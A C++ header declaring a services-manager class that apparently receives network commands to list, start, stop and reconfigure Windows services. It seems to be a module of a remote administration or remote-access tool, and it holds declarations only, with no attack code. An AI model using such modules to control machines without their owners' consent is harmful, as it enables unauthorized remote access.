#pragma once
#include "Manager.h"

enum
{
	ServicesStart = 1,
	ServicesStop,
	ServicesAuto,
	ServicesManual,

};
class CServicesManager :
	public CManager
{
public:
	CServicesManager(IOCPClient* ClientObject);
	virtual ~CServicesManager();
	VOID SendServicesList();
	LPBYTE GetServicesList();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);

	VOID ServicesConfig(LPBYTE szBuffer, ULONG ulLength);


public: 
	SC_HANDLE m_hscManager;
};

